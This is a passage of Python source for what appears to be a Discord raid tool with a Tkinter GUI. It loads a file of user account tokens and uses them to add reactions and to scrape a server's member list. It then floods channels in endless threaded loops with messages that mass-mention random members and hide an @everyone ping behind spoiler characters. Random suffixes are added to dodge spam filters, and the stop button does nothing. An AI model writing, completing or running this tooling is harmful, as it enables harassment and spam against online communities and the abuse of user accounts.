                                emojii = eeemj.emojize(emoji, language='alias')
                                emojiaa = urllib.parse.quote(emojii)
                                headers = {"authorization": l.rstrip("\n")}
                                req = requests.put(f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emojiaa}/%40me", headers=headers)
                                if req.status_code == 204:
                                    print(Color.GREEN+"成功 token:"+Color.RESET+l.rstrip("\n"))
                                if req.status_code == 403:
                                    print(Color.RED+"失敗 token:"+Color.RESET+l.rstrip("\n"))    
                                if req.status_code == 429:
                                    print(Color.RED+"⚠️レート制限⚠️"+Color.RESET)    
                            except:
                                print()         
            def spammer_start():
                threading.Thread(target=start_spam).start()    
            def start_spam():
                print("Spam Start")
                if spamchannelid_text.get() == "":
                    print(Fore.RED+"PLS INPUT CHANNEL_ID"+Fore.RESET)
                if spamserverid_text.get() == "":
                    print(Fore.RED+"PLS INPUT SERVER_ID"+Fore.RESET)    
                #print (int(mentioncount.get()))
                if alc.get():
                    if token_text.get() == "":
                        print(Fore.RED+"PLS INPUT TOKEN"+Fore.RESET)                        
                    ffs = open('message.txt',"r",encoding="utf-8_sig")
                    messages = ffs.read()
                    randoms = int(mentioncount.get())
                    channel_id = spamchannelid_text.get()
                    tokens = token_text.get()
                    guild_id = spamserverid_text.get()
                    bot = discum.Client(token=tokens, log=False)
                    def close_after_fetching(resp, guild_id):
                        if bot.gateway.finishedMemberFetching(guild_id):
                            bot.gateway.removeCommand({
                                'function': close_after_fetching,
                                'params': {
                                    'guild_id': guild_id
                                }
                            })
                            bot.gateway.close()

                    def get_members(guild_id, channel_id):
                        bot.gateway.fetchMembers(
                            guild_id, channel_id, keep="all",
                            wait=1)  #get all user attributes, wait 1 second between requests
                        bot.gateway.command({
                            'function': close_after_fetching,
                            'params': {
                                'guild_id': guild_id
                            }
                        })
                        bot.gateway.run()
                        bot.gateway.resetSession()  #saves 10 seconds when gateway is run again
                        return bot.gateway.session.guild(guild_id).members                    
                    members = get_members(guild_id, channel_id)
                    memberslist = []
                    for memberID in members:
                        print(f"メンバーを取得しました。{memberID}")
                        memberslist.append(memberID)   
                    if randoms > 0:
                        def alchalmt():
                            spams = ""
                            with open(token_file + '.txt') as f:
                                    lines = f.readlines()
                                    while True:
                                        for l in lines:
                                                #if allchannels == "y":
                                                #    channel_id = random.choice(chlist)
                                                #    print(channel_id)
                                                for _ in range(randoms):
                                                    spams += "<@" + random.choice(memberslist) + "> "
                                                randomed = randomname(10)
                                                payload = {"content": f"{messages}\n{spams}\n" + randomed}
                                                headers = {"authorization": l.rstrip("\n")}
                                                res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                                spams = ""
                                                print("Send: "+randomed)
                        while True:
                            time.sleep(0.7)
                            threading.Thread(target=alchalmt).start()                             
                else:
                    ffs = open('message.txt',"r",encoding="utf-8_sig")
                    messages = ffs.read()                    
                    randoms = int(mentioncount.get())
                    tokens = token_text.get()
                    guild_id = spamserverid_text.get()
                    token = token_text.get()
                    channel_id = spamchannelid_text.get()
                    chlist = get_channels(token,int(guild_id))
                    bot = discum.Client(token=tokens, log=False)
                    def close_after_fetching(resp, guild_id):
                        if bot.gateway.finishedMemberFetching(guild_id):
                            bot.gateway.removeCommand({
                                'function': close_after_fetching,
                                'params': {
                                    'guild_id': guild_id
                                }
                            })
                            bot.gateway.close()

                    def get_members(guild_id, channel_id):
                        bot.gateway.fetchMembers(
                            guild_id, channel_id, keep="all",
                            wait=1)  #get all user attributes, wait 1 second between requests
                        bot.gateway.command({
                            'function': close_after_fetching,
                            'params': {
                                'guild_id': guild_id
                            }
                        })
                        bot.gateway.run()
                        bot.gateway.resetSession()  #saves 10 seconds when gateway is run again
                        return bot.gateway.session.guild(guild_id).members                    
                    members = get_members(guild_id, channel_id)
                    memberslist = []
                    for memberID in members:
                        print(f"メンバーを取得しました。{memberID}")
                        memberslist.append(memberID)   
                    if randoms > 0:
                        def noalchalmt():
                            spams = ""
                            with open(token_file + '.txt') as f:
                                    lines = f.readlines()
                                    while True:
                                        for l in lines:
                                                #if allchannels == "y":
                                                #    channel_id = random.choice(chlist)
                                                #    print(channel_id)
                                                if clc.get():
                                                    payload = {"content": f"{messages} {randoms} " +"||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||@everyone"}
                                                for _ in range(randoms):
                                                    spams += "<@" + random.choice(memberslist) + "> "
                                                randomed = randomname(10)
                                                payload = {"content": f"{messages}\n{spams}\n" + randomed}
                                                headers = {"authorization": l.rstrip("\n")}
                                                res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                                spams = ""
                                                print("Send: "+randomed)
                        while True:
                            time.sleep(0.7)
                            threading.Thread(target=noalchalmt).start()                            
                if blc.get(): #alchalmt
                    if token_text.get() == "":
                        print(Fore.RED+"PLS INPUT TOKEN"+Fore.RESET)    
                else:         #alchnoalmt
                        def alchnoalmt():
                            ffs = open('message.txt',"r",encoding="utf-8_sig")
                            messages = ffs.read()
                            with ThreadPoolExecutor(max_workers=4) as executor:
                                with open(token_file + '.txt') as f:
                                    lines = f.readlines()
                                    while True:
                                        for l in lines:
                                            randoms = randomname(10)
                                            try:
                                                guild_id = spamserverid_text.get()
                                                token = token_text.get()
                                                chlist = get_channels(token,int(guild_id))
                                                channel_id = random.choice(chlist)
                                                if clc.get():
                                                    payload = {"content": f"{messages} {randoms} " +"||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||@everyone"}
                                                payload = {"content": f"{messages}\n"+randoms}
                                                headers = {"authorization": l.rstrip("\n")}
                                                res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                                spams = ""
                                                print("Send: "+randoms)
                                            except Exception as e:
                                                print("Error: "+ e)  
                        while True:
                            time.sleep(0.4)
                            threading.Thread(target=alchnoalmt).start()                                        
                #thread1 = threading.Thread(target=ghspam).start()             
            def stop_spam():
                # 思いつかない
                print("Stop Spam")                      
            # Option
            token_text = tk.StringVar()
            mentioncount = tk.DoubleVar()
            mentioncount.set(1)
            canvas = tk.Canvas(root, bg="grey13", height=118, width=300)
            canvas.place(x=15, y=640)
            spamlabel = tk.Label(text="Option",font=("Supernova",20,"bold"),foreground="#fff",bg="grey13")
            spamlabel.place(x=30, y=620)            
            tokenlabel = tk.Label(text="Token (Option)",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
            tokenlabel.place(x=30, y=655)
            tokenentry = tk.Entry(width=25,textvariable=token_text)
            tokenentry.place(x=30, y=680)
            mentionlabel = tk.Label(text="Mention (Option)",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
            mentionlabel.place(x=30, y=700)
            mentionscale = tk.Scale(variable=mentioncount, orient=tk.HORIZONTAL, length=180,from_=1, to=10, foreground="#fff", bg="grey13")
            mentionscale.place(x=30, y=720)
                        
            # # Spammer
            # serverid_text = tk.StringVar() 
            # channelid_text = tk.StringVar() 
            # alc = tk.BooleanVar()
            # alc.set(False) #allch
            # blc = tk.BooleanVar()
            # blc.set(False) #allmt
            # canvas = tk.Canvas(root, bg="grey13", height=330, width=175)
            # canvas.place(x=15, y=130)
            # spamlabel = tk.Label(text="Spammer",font=("Supernova",20,"bold"),foreground="#fff",bg="grey13")
            # spamlabel.place(x=30, y=110)
            # svidlabel = tk.Label(text="Server ID",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
            # svidlabel.place(x=30, y=160)
            # svidentry = tk.Entry(width=25,textvariable=serverid_text)
            # svidentry.place(x=30, y=185)
            # chidlabel = tk.Label(text="Channel ID",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
            # chidlabel.place(x=30, y=220)
            # chidentry = tk.Entry(width=25,textvariable=channelid_text)
            # chidentry.place(x=30, y=245)
            # allch = tk.Checkbutton(text="AllChannel",variable=alc,bg="#7c64e4",height=0, width=17)
            # allch.place(x=30, y=275)
            # allmt = tk.Checkbutton(text="AllMention",variable=blc,bg="#7c64e4",height=0, width=17)
            # allmt.place(x=30, y=310)
            # stsmbt = tk.Button(text="Start Spam",foreground='black', background='#88CEEB', command=spammer_start)
            # stsmbt.place(x=30,y=350,width=150,height=40)
            # wismbt = tk.Button(text="Stop Spam",foreground='black', background='#88CEEB', command=stop_spam)
            # wismbt.place(x=30,y=400,width=150,height=40)
                    
            # MODULE LIST
            canvas = tk.Canvas(root, bg="grey13", height=415, width=118)
            canvas.place(x=12, y=98)
            #tk.Button(text="Option",relief = tk.RAISED, width=15, bg="grey13", foreground="#fff", activebackground="white", command=option).place(x=16, y=101)                    
            tk.Button(text="Spammer",relief = tk.RAISED, width=15, bg="grey13", foreground="#fff", activebackground="white", command=spammer).place(x=16, y=101)
            tk.Button(text="Joiner Leaver",relief = tk.RAISED, width=15, bg="grey13", foreground="#fff", activebackground="white", command=joinerleaver).place(x=16, y=127)
            tk.Button(text="More",relief = tk.RAISED, width=15, bg="grey13", foreground="#fff", activebackground="white", command=more).place(x=16, y=487)
            root.mainloop()
    else:
        print("引数が不正または終了した操作です。")
        time.sleep(1)
        menu()        
menu()